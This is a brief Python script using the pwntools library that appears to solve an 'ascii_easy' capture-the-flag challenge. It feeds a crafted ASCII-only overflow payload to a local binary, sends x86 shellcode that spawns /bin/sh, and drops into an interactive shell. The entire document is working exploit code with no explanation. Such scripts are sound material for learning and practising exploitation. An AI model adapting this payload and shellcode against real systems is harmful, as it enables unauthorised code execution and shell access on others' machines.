from pwn import *



payload='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaU5_UnZkUpedi8zaU0d_U0d_U0d_U0d_U0d_U0d_U0d_U0d_U0d_U0d_U0d_U0d_UZd\`U-7jU-7jU-7jU-7jUK6cUQ*mUoZkUU5_UoZkUpedi\ T\`UmZkU'


p=process('./ascii_easy '+payload, shell=True)


shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"

p.sendline(shellcode)


p.interactive()
